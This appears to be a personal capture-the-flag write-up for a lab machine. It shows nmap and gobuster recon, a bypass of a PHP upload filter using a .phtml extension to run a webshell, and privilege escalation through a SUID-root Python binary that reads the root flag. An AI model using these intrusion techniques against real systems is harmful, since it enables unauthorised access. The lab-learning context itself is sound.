# RECON

```{sh}
>> nmap 10.10.240.217 -sV

Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-17 09:58 CET
Nmap scan report for 10.10.240.217
Host is up (0.049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.76 seconds

```


```{sh}
>>  gobuster dir -u http://10.10.240.217 -w ../../Tools/SecLists/Discovery/

Web-Content/common.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.240.217
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../../Tools/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2024/02/17 10:03:13 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.240.217/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 311] [--> http://10.10.240.217/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.240.217/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.240.217/uploads/]
Progress: 4625 / 4712 (98.15%)
===============================================================
2024/02/17 10:03:37 Finished
===============================================================

```

I can upload files, but not all types.

- idea: see if apache 2.2.49 has any known vulnerabilities (so far no luck)

- idea: check for other types of files that can be server side executed: 

    html    allowed     : served
    php     prohibited  : executed ?
    py      allowed     : downloaded
    asp     allowed     : downloaded
    jsp     allowed     : served
    perl    allowed     : downloaded

    conclustion: no
    - idea: how do i circumvent the prohibition? after trying some things with burp suite, i thought it is probably only checking the extension, so php is no go.
    
    other related types to php: phtml ---> executes as php :) After using the webshell from pentest monkey

(for some reason i could not get the reverse shell to work, so i used direct commands to get the user flag)

```{sh}
>> 'find / -type f -name "user.txt" 2>/dev/null'
>> 'cat /var/www/user.txt'
```

After this and by using the following command, i got the unsafe executable file:

```{sh}
>> find / -type f -perm /u+s -exec ls -la {} \;

-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9665/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9665/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
```


so /usr/bin/python has the suid set. By executing the following command, i got the root flag:

```{py}

import subprocess

subprocess.call(['find', '/','-type', 'f', '-name', 'root.txt'])
subprocess.call(['cat','/root/root.txt'])

```

Actually, this room made me decide on working in a simple php shell that worked in the browser, since i still was unable to get the reverse shell working. Also, i started getting a bash script working to do discovery on the system.


